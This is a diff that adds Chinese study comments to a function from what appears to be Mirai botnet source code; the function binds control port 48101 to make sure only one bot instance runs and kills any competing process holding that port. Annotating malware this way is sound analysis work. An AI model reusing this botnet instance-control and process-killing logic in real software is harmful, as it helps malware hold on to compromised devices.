@@ -421,6 +421,7 @@ static void teardown_connection(void)
     sleep(1);
 }
 
+//确保只有一个实例运行。。。绑定48101端口
 static void ensure_single_instance(void)
 {
     static BOOL local_bind = TRUE;
@@ -434,11 +435,11 @@ static void ensure_single_instance(void)
 
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
-    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT); //48101
 
     // Try to bind to the control port
     errno = 0;
-    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1) //绑定48101端口失败
     {
         if (errno == EADDRNOTAVAIL && local_bind)
             local_bind = FALSE;
@@ -446,12 +447,12 @@ static void ensure_single_instance(void)
         printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
 #endif
 
-        // Reset addr just in case
+        // Reset addr just in case  没懂
         addr.sin_family = AF_INET;
         addr.sin_addr.s_addr = INADDR_ANY;
         addr.sin_port = htons(SINGLE_INSTANCE_PORT);
 
-        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)//为啥又连一次
         {
 #ifdef DEBUG
             printf("[main] Failed to connect to fd_ctrl to request process termination\n");
@@ -460,7 +461,7 @@ static void ensure_single_instance(void)
         
         sleep(5);
         close(fd_ctrl);
-        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));//杀掉已经存在的实例
         ensure_single_instance(); // Call again, so that we are now the control
     }
     else
@@ -476,7 +477,7 @@ static void ensure_single_instance(void)
 #endif
         }
 #ifdef DEBUG
-        printf("[main] We are the only process on this system!\n");
+        printf("[main] We are the only process on this system!\n");  //设备中48101端口被占用就表示设备中已经有bot程序
 #endif
     }
 }
